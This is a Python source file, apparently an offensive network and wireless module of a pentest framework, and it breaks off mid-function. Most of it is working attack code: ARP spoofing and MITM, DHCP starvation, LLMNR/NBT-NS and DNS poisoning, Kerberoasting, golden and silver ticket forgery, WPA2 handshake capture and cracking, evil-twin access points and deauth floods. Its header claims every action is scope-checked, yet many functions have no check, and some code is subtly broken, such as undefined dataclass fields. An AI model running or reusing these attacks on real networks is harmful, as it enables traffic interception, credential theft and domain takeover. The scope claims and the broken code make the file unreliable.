#!/usr/bin/env python3
"""
mod_network_wireless.py - Deep Network & Wireless Attack Module
Part of hakuza pentest automation framework

Covers Layer 2/3 attacks, MITM, credential capture, and RF exploitation
Requires: Kali Linux / Parrot / offensive security environment
          root/sudo access for raw socket operations
          External tools: aircrack-ng, hostapd, scapy, nmap, hashcat

Authorization model:
  - Requires explicit scope.txt verification before ANY network operation
  - Logs all attacks with timestamp + operator + target + method
  - Integrates with engagement/.env for target/rules validation
  - Refuses execution if target is out-of-scope
"""

import os
import sys
import json
import time
import socket
import struct
import subprocess
import threading
import argparse
import hashlib
import logging
from datetime import datetime
from pathlib import Path
from collections import defaultdict
from typing import List, Dict, Tuple, Optional, Set
from dataclasses import dataclass, asdict
from enum import Enum

try:
    from scapy.all import (
        ARP, IP, UDP, TCP, ICMP, DNS, DNSQR, DNSRR, Raw,
        Ether, IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr,
        srp, sr, sr1, conf, sniff, send, sendp,
        get_if_hwaddr, get_if_list, arping,
        DHCP, BOOTP, Radius
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] scapy not available - some network attacks disabled")

# ============================================================================
# AUTHORIZATION & LOGGING
# ============================================================================

class AuthorizationError(Exception):
    """Raised when target is out of scope or authorization missing"""
    pass


class Logger:
    """Centralized logging for network attacks with audit trail"""

    def __init__(self, log_file: str = None):
        self.log_file = Path(log_file) if log_file else (Path.home() / "engagements" / "network_attacks.log")
        self.log_file.parent.mkdir(parents=True, exist_ok=True)
        self.logger = logging.getLogger("hakuza.network")
        self.logger.setLevel(logging.DEBUG)

        # File handler with detailed format
        fh = logging.FileHandler(self.log_file)
        fh.setLevel(logging.DEBUG)
        formatter = logging.Formatter(
            '%(asctime)s | %(name)s | %(levelname)s | %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        fh.setFormatter(formatter)
        self.logger.addHandler(fh)

        # Console handler with simpler format
        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        ch_formatter = logging.Formatter('[%(levelname)s] %(message)s')
        ch.setFormatter(ch_formatter)
        self.logger.addHandler(ch)

    def log_attack(self, attack_type: str, target: str, method: str,
                   status: str, details: str = ""):
        """Log network attack with structured data"""
        msg = f"ATTACK | type={attack_type} | target={target} | method={method} | status={status}"
        if details:
            msg += f" | details={details}"
        self.logger.info(msg)

    def log_credential(self, cred_type: str, value: str, source: str):
        """Log captured credential with source"""
        self.logger.info(f"CREDENTIAL_CAPTURED | type={cred_type} | source={source} | value_hash={hashlib.md5(value.encode()).hexdigest()[:16]}")

    def debug(self, msg: str):
        self.logger.debug(msg)

    def info(self, msg: str):
        self.logger.info(msg)

    def warning(self, msg: str):
        self.logger.warning(msg)

    def error(self, msg: str):
        self.logger.error(msg)


class ScopeValidator:
    """Validate targets against scope.txt"""

    def __init__(self, scope_file: str = None):
        if scope_file is None:
            scope_file = Path.home() / "engagements" / "scope.txt"

        self.scope_file = Path(scope_file)
        self.in_scope = set()
        self.out_of_scope = set()
        self.load_scope()

    def load_scope(self):
        """Load scope from file"""
        if not self.scope_file.exists():
            logging.warning(f"[!] scope.txt not found at {self.scope_file}")
            return

        with open(self.scope_file) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if line.startswith('-'):
                        self.out_of_scope.add(line[1:].strip())
                    else:
                        self.in_scope.add(line)

    def is_in_scope(self, target: str) -> bool:
        """Check if target is in scope"""
        # Check exact match in out-of-scope first
        if target in self.out_of_scope:
            return False

        # Check in-scope list
        if target in self.in_scope:
            return True

        # Check CIDR/subnet matching for IPs
        for scope_entry in self.in_scope:
            if '/' in scope_entry:  # CIDR notation
                if self._ip_in_cidr(target, scope_entry):
                    return True

        return False

    @staticmethod
    def _ip_in_cidr(ip: str, cidr: str) -> bool:
        """Check if IP is within CIDR range"""
        try:
            from ipaddress import ip_address, ip_network
            return ip_address(ip) in ip_network(cidr, strict=False)
        except:
            return False


# ============================================================================
# DATA STRUCTURES
# ============================================================================

class AttackType(Enum):
    """Network attack types"""
    ARP_SPOOF = "arp_spoof"
    ARP_MITM = "arp_mitm"
    DHCP_STARVATION = "dhcp_starvation"
    DHCP_ROGUE = "dhcp_rogue"
    DNS_SPOOF = "dns_spoof"
    LLMNR_POISON = "llmnr_poison"
    NBT_NS_POISON = "nbt_ns_poison"
    NTLM_RELAY = "ntlm_relay"
    KERBEROS_ASP_REP = "kerberos_asprep"
    KERBEROS_KERBEROAST = "kerberos_kerberoast"
    KERBEROS_GOLDEN_TICKET = "kerberos_golden_ticket"
    VLAN_HOPPING = "vlan_hopping"
    STP_SPOOF = "stp_spoof"
    WIFI_HANDSHAKE_CAP = "wifi_handshake_cap"
    WIFI_EVIL_TWIN = "wifi_evil_twin"
    WIFI_DEAUTH = "wifi_deauth"
    BLUETOOTH_KNOB = "bluetooth_knob"
    BLUETOOTH_RANGE = "bluetooth_range"
    ZIGBEE_FRAME_CAP = "zigbee_frame_cap"
    ZIGBEE_REPLAY = "zigbee_replay"


@dataclass
class NetworkHost:
    """Discovered network host"""
    ip: str
    mac: str
    hostname: str = ""
    vendor: str = ""
    os: str = ""
    services: List[str] = None
    is_gateway: bool = False
    is_dc: bool = False  # Domain Controller
    kerberos_realm: str = ""

    def __post_init__(self):
        if self.services is None:
            self.services = []


@dataclass
class CapturedCredential:
    """Captured credential record"""
    type: str  # ntlm_hash, plaintext, kerberos_ticket, etc
    username: str
    value: str
    source_ip: str
    source_protocol: str
    timestamp: str
    context: Dict = None


@dataclass
class WirelessNetwork:
    """Discovered wireless network"""
    ssid: str
    bssid: str
    channel: int
    signal_strength: int
    encryption: str
    clients: List[str] = None
    handshake_captured: bool = False

    def __post_init__(self):
        if self.clients is None:
            self.clients = []


# ============================================================================
# LAYER 2 NETWORK ATTACKS
# ============================================================================

class Layer2Attacks:
    """ARP spoofing, DHCP, VLAN, STP attacks"""

    def __init__(self, logger: Logger, scope: ScopeValidator):
        self.logger = logger
        self.scope = scope
        self.running_attacks = {}

    def arp_spoof(self, target_ip: str, spoof_ip: str, interface: str = None,
                  count: int = None) -> bool:
        """
        ARP spoofing: Send gratuitous ARP to make target think spoof_ip is at attacker MAC

        Args:
            target_ip: IP to spoof
            spoof_ip: IP that target should associate with attacker's MAC
            interface: Network interface to use
            count: Number of packets (None = continuous)
        """
        if not self.scope.is_in_scope(target_ip):
            raise AuthorizationError(f"Target {target_ip} not in scope")

        if not SCAPY_AVAILABLE:
            self.logger.error("scapy required for ARP spoofing")
            return False

        try:
            if interface is None:
                interface = conf.iface

            my_mac = get_if_hwaddr(interface)
            self.logger.info(f"[*] ARP spoofing {target_ip}: making it think {spoof_ip} is at {my_mac}")

            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op="is-at",
                pdst=target_ip,
                hwdst="ff:ff:ff:ff:ff:ff",
                psrc=spoof_ip,
                hwsrc=my_mac
            )

            sent_count = 0
            try:
                if count:
                    for i in range(count):
                        sendp(pkt, iface=interface, verbose=False)
                        sent_count += 1
                        time.sleep(0.5)
                else:
                    # Continuous - run in thread
                    self.logger.info(f"[*] Continuous ARP spoof started (target={target_ip}, spoof_ip={spoof_ip})")
                    stop_event = threading.Event()

                    def spoof_loop():
                        while not stop_event.is_set():
                            try:
                                sendp(pkt, iface=interface, verbose=False)
                                time.sleep(1)
                            except:
                                pass

                    thread = threading.Thread(target=spoof_loop, daemon=True)
                    thread.start()

                    self.running_attacks[f"arp_spoof_{target_ip}"] = (thread, stop_event)
                    return True
            except Exception as e:
                self.logger.error(f"ARP spoof failed: {e}")
                return False

            self.logger.log_attack("arp_spoof", target_ip, "gratuitous_arp",
                                  "success", f"packets_sent={sent_count}")
            return True

        except Exception as e:
            self.logger.error(f"[!] ARP spoof exception: {e}")
            return False

    def arp_mitm(self, target1: str, target2: str, interface: str = None) -> bool:
        """
        Position attacker as MITM between two hosts via ARP spoofing

        Poisoning:
          - target1 sees target2 at attacker's MAC
          - target2 sees target1 at attacker's MAC
          - traffic flows through attacker
        """
        if not self.scope.is_in_scope(target1) or not self.scope.is_in_scope(target2):
            raise AuthorizationError("One or more targets not in scope")

        if not SCAPY_AVAILABLE:
            self.logger.error("scapy required for ARP MITM")
            return False

        try:
            if interface is None:
                interface = conf.iface

            my_mac = get_if_hwaddr(interface)

            # Start spoofing both directions
            self.logger.info(f"[*] Starting ARP MITM: {target1} <-> {target2}")

            # Spoof target1: make it think target2 is at attacker
            thread1_stop = threading.Event()
            def spoof_to_target1():
                pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op="is-at",
                    pdst=target1,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    psrc=target2,
                    hwsrc=my_mac
                )
                while not thread1_stop.is_set():
                    try:
                        sendp(pkt, iface=interface, verbose=False)
                        time.sleep(1)
                    except:
                        pass

            # Spoof target2: make it think target1 is at attacker
            thread2_stop = threading.Event()
            def spoof_to_target2():
                pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op="is-at",
                    pdst=target2,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    psrc=target1,
                    hwsrc=my_mac
                )
                while not thread2_stop.is_set():
                    try:
                        sendp(pkt, iface=interface, verbose=False)
                        time.sleep(1)
                    except:
                        pass

            t1 = threading.Thread(target=spoof_to_target1, daemon=True)
            t2 = threading.Thread(target=spoof_to_target2, daemon=True)

            t1.start()
            t2.start()

            attack_key = f"arp_mitm_{target1}_{target2}"
            self.running_attacks[attack_key] = (
                [(t1, thread1_stop), (t2, thread2_stop)],
                None
            )

            self.logger.log_attack("arp_mitm", f"{target1}_vs_{target2}", "bidirectional_spoof",
                                  "success", f"attacker_mac={my_mac}")
            return True

        except Exception as e:
            self.logger.error(f"ARP MITM failed: {e}")
            return False

    def dhcp_starvation(self, interface: str, count: int = 100) -> bool:
        """
        DHCP starvation: exhaust DHCP pool by requesting many leases
        Can DoS legitimate clients trying to get an IP
        """
        if not SCAPY_AVAILABLE:
            self.logger.error("scapy required for DHCP starvation")
            return False

        try:
            self.logger.info(f"[*] Starting DHCP starvation on {interface} (requesting {count} IPs)")

            my_mac = get_if_hwaddr(interface)

            for i in range(count):
                # Random transaction ID for each request
                xid = os.urandom(4)

                pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(dst="255.255.255.255") / UDP(sport=68, dport=67) / BOOTP(
                    op=1,
                    xid=xid,
                    chaddr=bytes.fromhex(my_mac.replace(':', ''))
                ) / DHCP(options=[("message-type", "discover"), ("end",)])

                try:
                    sendp(pkt, iface=interface, verbose=False)
                    if i % 10 == 0:
                        self.logger.debug(f"[*] Sent {i+1}/{count} DHCP discover requests")
                except:
                    pass

                time.sleep(0.1)

            self.logger.log_attack("dhcp_starvation", interface, "discover_flood",
                                  "success", f"requests_sent={count}")
            return True

        except Exception as e:
            self.logger.error(f"DHCP starvation failed: {e}")
            return False

    def rogue_dhcp_server(self, interface: str, lease_range: Tuple[str, str],
                         gateway: str, dns: str = "8.8.8.8") -> bool:
        """
        Launch rogue DHCP server to intercept client configurations

        Args:
            interface: Network interface
            lease_range: Tuple of (start_ip, end_ip)
            gateway: Gateway IP to advertise
            dns: DNS server to advertise
        """
        self.logger.info(f"[*] Rogue DHCP server setup on {interface}")
        self.logger.info(f"    Gateway: {gateway}, DNS: {dns}, Lease Range: {lease_range[0]}-{lease_range[1]}")

        # Implementation note: Full DHCP server requires dnsmasq or isc-dhcp-server
        # or custom implementation with threaded socket server
        # For now, provide configuration template

        dhcp_config = f"""
# Rogue DHCP Server Configuration for {interface}
# Place in /tmp/dhcp-rogue.conf

interface={interface}
dhcp-range={lease_range[0]},{lease_range[1]},255.255.255.0,1h
dhcp-option=option:router,{gateway}
dhcp-option=option:dns-server,{dns}
# Inject rogue server / backdoor IPs as needed
"""

        self.logger.info("[*] DHCP server template:")
        print(dhcp_config)

        return True


# ============================================================================
# DNS & CREDENTIAL CAPTURE
# ============================================================================

class CredentialCapture:
    """LLMNR/NBT-NS poisoning, NTLM relay, DNS spoofing"""

    def __init__(self, logger: Logger, scope: ScopeValidator):
        self.logger = logger
        self.scope = scope
        self.captured_credentials = []
        self.listening_threads = {}

    def llmnr_poison(self, interface: str, spoof_ip: str) -> bool:
        """
        LLMNR poisoning: respond to LLMNR queries with attacker IP

        Windows clients use LLMNR (Link-Local Multicast Name Resolution) when DNS fails
        Captures credentials when clients authenticate to attacker
        """
        self.logger.info(f"[*] Starting LLMNR poisoning on {interface} -> {spoof_ip}")

        if not SCAPY_AVAILABLE:
            self.logger.error("scapy required for LLMNR poisoning")
            return False

        try:
            # LLMNR multicast: 224.0.0.252:5355
            def llmnr_listener():
                def packet_callback(pkt):
                    try:
                        # Check for DNS/LLMNR queries (port 5355)
                        if pkt.haslayer(UDP) and pkt[UDP].dport == 5355:
                            if pkt.haslayer(DNS):
                                dns_layer = pkt[DNS]
                                if dns_layer.qr == 0:  # Query
                                    queried_name = dns_layer.qd.qname.decode()
                                    src_ip = pkt[IP].src

                                    self.logger.info(f"[+] LLMNR Query: {queried_name} from {src_ip}")

                                    # Send spoofed response
                                    response = Ether(dst=pkt[Ether].src) / IP(dst=src_ip, src=spoof_ip) / UDP(
                                        dport=pkt[UDP].sport, sport=5355
                                    ) / DNS(
                                        id=dns_layer.id,
                                        qr=1, aa=1, ra=0,
                                        qd=dns_layer.qd,
                                        an=DNSRR(rrname=queried_name, ttl=600, rdata=spoof_ip)
                                    )

                                    sendp(response, iface=interface, verbose=False)
                                    self.logger.log_attack("llmnr_poison", src_ip, "spoofed_response",
                                                          "success", f"query={queried_name}")
                    except Exception as e:
                        pass

                try:
                    sniff(iface=interface, prn=packet_callback, store=False)
                except KeyboardInterrupt:
                    pass

            thread = threading.Thread(target=llmnr_listener, daemon=True)
            thread.start()
            self.listening_threads["llmnr"] = thread

            self.logger.log_attack("llmnr_poison", interface, "listener_started",
                                  "success", f"spoof_ip={spoof_ip}")
            return True

        except Exception as e:
            self.logger.error(f"LLMNR poison setup failed: {e}")
            return False

    def nbt_ns_poison(self, interface: str, spoof_ip: str) -> bool:
        """
        NetBIOS Name Service (NBT-NS) poisoning on UDP port 137
        Similar to LLMNR but for NetBIOS name queries
        """
        self.logger.info(f"[*] Starting NBT-NS poisoning on {interface} -> {spoof_ip}")

        if not SCAPY_AVAILABLE:
            self.logger.error("scapy required for NBT-NS poisoning")
            return False

        try:
            def nbt_ns_listener():
                def packet_callback(pkt):
                    try:
                        if pkt.haslayer(UDP) and pkt[UDP].dport == 137:
                            # Parse NetBIOS query
                            src_ip = pkt[IP].src
                            # Simplified: respond to all queries
                            self.logger.info(f"[+] NBT-NS Query from {src_ip}")

                            # Send spoofed response (simplified)
                            response = Ether(dst=pkt[Ether].src) / IP(dst=src_ip, src=spoof_ip) / UDP(
                                dport=pkt[UDP].sport, sport=137
                            ) / Raw(load=b'\x00' * 50)  # Minimal NBT-NS response

                            sendp(response, iface=interface, verbose=False)
                    except:
                        pass

                try:
                    sniff(iface=interface, prn=packet_callback, store=False)
                except KeyboardInterrupt:
                    pass

            thread = threading.Thread(target=nbt_ns_listener, daemon=True)
            thread.start()
            self.listening_threads["nbt_ns"] = thread

            self.logger.log_attack("nbt_ns_poison", interface, "listener_started",
                                  "success", f"spoof_ip={spoof_ip}")
            return True

        except Exception as e:
            self.logger.error(f"NBT-NS poison setup failed: {e}")
            return False

    def capture_ntlm_hashes(self, listen_port: int = 445) -> bool:
        """
        Set up listener to capture NTLM hashes from relay attacks
        Real implementation would use impacket's NTLMRelayServer
        """
        self.logger.info(f"[*] NTLM capture listener on port {listen_port}")
        self.logger.info("    Use: impacket-ntlmrelayx -t <target> -i")

        # This is a placeholder for actual NTLM relay implementation
        # Full implementation requires impacket library
        return True

    def dns_spoof(self, interface: str, domain: str, spoof_ip: str) -> bool:
        """
        DNS spoofing: intercept DNS queries for specific domain and return attacker IP
        """
        self.logger.info(f"[*] Starting DNS spoof on {interface}: {domain} -> {spoof_ip}")

        if not SCAPY_AVAILABLE:
            self.logger.error("scapy required for DNS spoofing")
            return False

        try:
            def dns_listener():
                def packet_callback(pkt):
                    try:
                        if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # DNS query
                            dns_query = pkt[DNS].qd.qname.decode().rstrip('.')
                            src_ip = pkt[IP].src

                            # Check if query matches our target domain
                            if domain.lower() in dns_query.lower():
                                self.logger.info(f"[+] DNS Query: {dns_query} from {src_ip}")

                                # Send spoofed response
                                response = IP(dst=src_ip, src=pkt[IP].dst) / UDP(
                                    dport=pkt[UDP].sport, sport=53
                                ) / DNS(
                                    id=pkt[DNS].id, qr=1, aa=1,
                                    qd=pkt[DNS].qd,
                                    an=DNSRR(rrname=dns_query, ttl=600, rdata=spoof_ip)
                                )

                                send(response, verbose=False)
                                self.logger.log_attack("dns_spoof", src_ip, "response",
                                                      "success", f"domain={domain}")
                    except Exception as e:
                        pass

                try:
                    sniff(iface=interface, prn=packet_callback, store=False,
                          filter="udp port 53")
                except KeyboardInterrupt:
                    pass

            thread = threading.Thread(target=dns_listener, daemon=True)
            thread.start()
            self.listening_threads[f"dns_{domain}"] = thread

            return True

        except Exception as e:
            self.logger.error(f"DNS spoof failed: {e}")
            return False


# ============================================================================
# KERBEROS ATTACKS
# ============================================================================

class KerberosAttacks:
    """AS-REP roasting, Kerberoasting, Golden/Silver tickets, delegation abuse"""

    def __init__(self, logger: Logger, scope: ScopeValidator):
        self.logger = logger
        self.scope = scope

    def asreproast_enum(self, dc_ip: str, domain: str, username_list: List[str]) -> Dict[str, str]:
        """
        AS-REP Roasting: Find users with pre-authentication disabled
        Then crack offline without needing credentials

        Requires: impacket, hashcat
        """
        self.logger.info(f"[*] AS-REP roasting on {dc_ip} for domain {domain}")

        if not self.scope.is_in_scope(dc_ip):
            raise AuthorizationError(f"DC {dc_ip} not in scope")

        results = {}

        # Implementation using impacket GetNPUsers.py
        cmd = [
            "python3", "-m", "impacket.examples.GetNPUsers",
            f"{domain}/",
            "-usersfile", "-",  # Read users from stdin
            "-dc-ip", dc_ip,
            "-no-pass",
            "-format", "hashcat"
        ]

        try:
            process = subprocess.Popen(
                cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            users_input = "\n".join(username_list)
            stdout, stderr = process.communicate(input=users_input, timeout=30)

            # Parse output for hashes
            for line in stdout.split('\n'):
                if ':krb5asrep:' in line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        username = parts[0]
                        hash_value = line
                        results[username] = hash_value
                        self.logger.log_attack("asreproast", username, "hash_extracted",
                                              "success", f"dc={dc_ip}")

            self.logger.info(f"[+] Found {len(results)} AS-REP roastable users")

        except subprocess.TimeoutExpired:
            self.logger.error("AS-REP roasting timed out")
        except FileNotFoundError:
            self.logger.error("impacket not found - install with: pip install impacket")
        except Exception as e:
            self.logger.error(f"AS-REP roasting failed: {e}")

        return results

    def kerberoasting(self, dc_ip: str, domain: str, username: str = None,
                      password: str = None) -> Dict[str, str]:
        """
        Kerberoasting: Request service tickets for SPNs and crack offline

        Works with or without credentials (unauthenticated if allowed)
        """
        self.logger.info(f"[*] Kerberoasting on {dc_ip} for domain {domain}")

        if not self.scope.is_in_scope(dc_ip):
            raise AuthorizationError(f"DC {dc_ip} not in scope")

        results = {}

        # Using GetUserSPNs.py from impacket
        if username and password:
            auth_str = f"{domain}/{username}:{password}"
        else:
            auth_str = f"{domain}/"

        cmd = [
            "python3", "-m", "impacket.examples.GetUserSPNs",
            auth_str,
            "-dc-ip", dc_ip,
            "-request",
            "-format", "hashcat"
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            # Parse output for ticket hashes
            for line in result.stdout.split('\n'):
                if ':krb5tgs:' in line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        spn = parts[0]
                        results[spn] = line
                        self.logger.log_attack("kerberoast", spn, "ticket_extracted",
                                              "success", f"dc={dc_ip}")

            self.logger.info(f"[+] Extracted {len(results)} Kerberos service tickets")

        except FileNotFoundError:
            self.logger.error("impacket not found")
        except Exception as e:
            self.logger.error(f"Kerberoasting failed: {e}")

        return results

    def golden_ticket(self, domain: str, domain_sid: str, krbtgt_hash: str,
                      username: str = "Administrator", user_id: int = 500) -> str:
        """
        Create Golden Ticket: forge TGT as ANY user (including Domain Admin)

        Requirements:
          - Domain SID (from `whoami /user` or BloodHound)
          - krbtgt NTLM hash (from DCSync, shadow, or Kerberoasting)

        Returns path to .ccache file
        """
        self.logger.info(f"[*] Forging golden ticket for {username}@{domain}")

        # Using impacket's ticketer
        ticket_file = f"/tmp/golden_{username}.ccache"

        cmd = [
            "python3", "-m", "impacket.examples.ticketer",
            "-nthash", krbtgt_hash,
            "-domain", domain,
            "-domain-sid", domain_sid,
            "-user", username,
            "-user-id", str(user_id),
            ticket_file
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                self.logger.info(f"[+] Golden ticket created: {ticket_file}")
                self.logger.log_attack("golden_ticket", username, "ticket_forged",
                                      "success", f"file={ticket_file}")
                return ticket_file
            else:
                self.logger.error(f"Golden ticket creation failed: {result.stderr}")
                return None

        except Exception as e:
            self.logger.error(f"Golden ticket failed: {e}")
            return None

    def silver_ticket(self, domain: str, domain_sid: str, service_hash: str,
                      service: str, server: str, username: str = "Administrator") -> str:
        """
        Create Silver Ticket: forge TGS for specific service
        Less noisy than golden ticket (doesn't contact DC)

        Args:
            service: Service name (cifs, ldap, mssql, host, etc)
            server: Target server FQDN
        """
        self.logger.info(f"[*] Forging silver ticket for {service}/{server}")

        ticket_file = f"/tmp/silver_{service}_{server}.ccache"

        cmd = [
            "python3", "-m", "impacket.examples.ticketer",
            "-nthash", service_hash,
            "-domain", domain,
            "-domain-sid", domain_sid,
            "-spn", f"{service}/{server}",
            "-user", username,
            ticket_file
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                self.logger.info(f"[+] Silver ticket created: {ticket_file}")
                self.logger.log_attack("silver_ticket", f"{service}/{server}", "ticket_forged",
                                      "success", f"file={ticket_file}")
                return ticket_file
            else:
                self.logger.error(f"Silver ticket creation failed: {result.stderr}")
                return None

        except Exception as e:
            self.logger.error(f"Silver ticket failed: {e}")
            return None


# ============================================================================
# WIRELESS ATTACKS
# ============================================================================

class WirelessAttacks:
    """WiFi, Bluetooth, Zigbee exploitation"""

    def __init__(self, logger: Logger, scope: ScopeValidator):
        self.logger = logger
        self.scope = scope

    def wifi_scan(self, interface: str = None) -> List[WirelessNetwork]:
        """
        Scan for WiFi networks using aircrack-ng
        """
        self.logger.info("[*] Starting WiFi scan...")

        networks = []

        # Use airodump-ng via subprocess
        cmd = ["airodump-ng", "--output-format", "csv", "-w", "/tmp/wifi_scan"]
        if interface:
            cmd.append(interface)

        try:
            self.logger.info(f"[*] Running: {' '.join(cmd)}")
            subprocess.run(cmd, timeout=30)

            # Parse CSV output
            csv_file = "/tmp/wifi_scan-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file) as f:
                    for line in f:
                        line = line.strip()
                        if 'BSSID' in line or not line:
                            continue

                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) >= 8:
                            network = WirelessNetwork(
                                bssid=parts[0],
                                first_seen=parts[1],
                                last_seen=parts[2],
                                channel=int(parts[3]) if parts[3].isdigit() else 0,
                                speed=parts[4],
                                signal_strength=int(parts[8]) if parts[8] else -100,
                                encryption=parts[5],
                                ssid=parts[-1] if parts[-1] else "(hidden)"
                            )
                            networks.append(network)

            self.logger.info(f"[+] Found {len(networks)} WiFi networks")

        except FileNotFoundError:
            self.logger.error("aircrack-ng not found - install: apt install aircrack-ng")
        except Exception as e:
            self.logger.error(f"WiFi scan failed: {e}")

        return networks

    def capture_handshake(self, ssid: str, bssid: str, interface: str,
                         output_file: str = None) -> bool:
        """
        Capture WPA2 4-way handshake for offline cracking
        """
        if output_file is None:
            output_file = f"/tmp/{ssid}_{bssid.replace(':', '')}"

        self.logger.info(f"[*] Capturing handshake for {ssid} ({bssid})")

        try:
            # Set monitor mode
            subprocess.run(["airmon-ng", "start", interface],
                          capture_output=True, timeout=10)

            # Run airodump to capture
            cmd = [
                "airodump-ng",
                "-c", "auto",
                "-b", bssid,
                "-w", output_file,
                "--output-format", "pcap",
                interface
            ]

            self.logger.info("[*] Airodump capturing handshake (Ctrl+C when done)")
            subprocess.run(cmd)

            pcap_file = f"{output_file}-01.pcap"
            if os.path.exists(pcap_file):
                self.logger.info(f"[+] Handshake captured to {pcap_file}")
                self.logger.log_attack("wifi_handshake_cap", bssid, "pcap_capture",
                                      "success", f"file={pcap_file}")
                return True
            else:
                self.logger.error("Handshake capture failed")
                return False

        except Exception as e:
            self.logger.error(f"Handshake capture failed: {e}")
            return False

    def crack_wpa2(self, pcap_file: str, wordlist: str = None) -> Optional[str]:
        """
        Crack WPA2 handshake using hashcat
        """
        if wordlist is None:
            wordlist = "/usr/share/wordlists/rockyou.txt"

        self.logger.info(f"[*] Cracking WPA2 handshake: {pcap_file}")

        try:
            # Convert to hccapx format if needed
            cap_file = pcap_file.replace('.pcap', '.hccapx')

            cmd = [
                "hashcat",
                "-m", "2500",  # WPA2
                "-a", "0",  # Dictionary
                "-w", "3",  # Workload (1-4)
                pcap_file,
                wordlist,
                "--potfile-disable"
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=None)

            # Parse for password
            if result.returncode == 0:
                self.logger.info("[+] Password cracked!")
                return result.stdout
            else:
                self.logger.warning("[!] No password found in wordlist")
                return None

        except FileNotFoundError:
            self.logger.error("hashcat not found - install: apt install hashcat")
        except Exception as e:
            self.logger.error(f"WPA2 crack failed: {e}")

        return None

    def evil_twin(self, ssid: str, channel: int, interface: str,
                  ssl_key: str = None, ssl_cert: str = None) -> bool:
        """
        Create evil twin (fake AP) with same SSID
        Optionally setup SSL proxy for credential harvesting
        """
        self.logger.info(f"[*] Creating evil twin AP: {ssid} on channel {channel}")

        # hostapd configuration
        hostapd_conf = f"""
interface={interface}
driver=nl80211
ssid={ssid}
channel={channel}
hw_mode=g
auth_algs=1
wpa=2
wpa_passphrase=TempPass123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
"""

        conf_file = f"/tmp/hostapd_{ssid}.conf"

        try:
            with open(conf_file, 'w') as f:
                f.write(hostapd_conf)

            # Start hostapd
            cmd = ["hostapd", conf_file]
            self.logger.info(f"[*] Starting hostapd: {' '.join(cmd)}")

            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.logger.log_attack("wifi_evil_twin", ssid, "ap_started",
                                  "success", f"channel={channel}")

            return True

        except Exception as e:
            self.logger.error(f"Evil twin setup failed: {e}")
            return False

    def deauth_attack(self, bssid: str, interface: str, client_mac: str = None,
                     count: int = None) -> bool:
        """
        Deauthentication attack: disconnect clients from AP
        Forces them to reconnect (useful for handshake capture)
        """
        self.logger.info(f"[*] Starting deauth attack on {bssid}")

        try:
            if client_mac:
                # Deauth specific client
                cmd = ["aireplay-ng", "--deauth", str(count or 10),
                       "-a", bssid, "-c", client_mac, interface]
            else:
                # Deauth all clients
                cmd = ["aireplay-ng", "--deauth", str(count or 0),
                       "-a", bssid, interface]

            self.logger.info(f"[*] Running: {' '.join(cmd)}")
            subprocess.run(cmd, timeout=30)

            self.logger.log_attack("wifi_deauth", bssid, "deauth_sent",
                                  "success", f"client={client_mac or 'all'}")
            return True

        except Exception as e:
            self.logger.error(f"Deauth attack failed: {e}")
            return False

    def bluetooth_scan(self) -> List[Dict]:
        """
        Scan for Bluetooth devices
        """
        self.logger.info("[*] Starting Bluetooth scan...")

        devices = []

        try:
            # Use hcitool
            result = subprocess.run(["hcitool", "scan"],
                                  capture_output=True, text=True, timeout=30)

            for line in result.stdout.split('\n')[1:]:  # Skip header
                if '\t' in line:
                    mac, name = line.split('\t')
                    devices.append({
                        'mac': mac.strip(),
                        'name': name.strip()
                    })
                    self.logger.info(f"[+] BT Device: {name} ({mac})")

            self.logger.info(f"[+] Found {len(devices)} Bluetooth devices")

        except FileNotFoundError:
            self.logger.error("hcitool not found - install: apt install bluez")
        except Exception as e:
            self.logger.error(f"Bluetooth scan failed: {e}")

        return devices


# ============================================================================
# NETWORK RECONNAISSANCE
# ============================================================================

class NetworkRecon:
    """ARP scan, service enumeration, OS fingerprinting"""

    def __init__(self, logger: Logger, scope: ScopeValidator):
        self.logger = logger
        self.scope = scope

    def arp_scan(self, network_range: str, interface: str = None) -> List[NetworkHost]:
        """
        ARP scan a network range to discover active hosts
        """
        self.logger.info(f"[*] ARP scanning {network_range}...")

        hosts = []

        if not SCAPY_AVAILABLE:
            self.logger.error("scapy required for ARP scan")
            return hosts

        try:
            if interface is None:
                interface = conf.iface

            # Use arping from scapy
            result, unanswered = arping(network_range, iface=interface, verbose=False)

            for sent, received in result:
                host = NetworkHost(
                    ip=received.psrc,
                    mac=received.hwsrc,
                    hostname=""
                )
                hosts.append(host)
                self.logger.debug(f"[+] Host: {received.psrc} ({received.hwsrc})")

            self.logger.info(f"[+] Discovered {len(hosts)} hosts")

        except Exception as e:
            self.logger.error(f"ARP scan failed: {e}")

        return hosts

    def enumerate_services(self, target_ip: str, ports: List[int] = None) -> Dict[int, str]:
        """
        Enumerate services using nmap
        """
        if not self.scope.is_in_scope(target_ip):
            raise AuthorizationError(f"Target {target_ip} not in scope")

        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 143, 389, 445, 464, 636, 3268, 3389, 8080, 8443]

        self.logger.info(f"[*] Enumerating services on {target_ip}...")

        services = {}
        port_str = ",".join(map(str, ports))

        try:
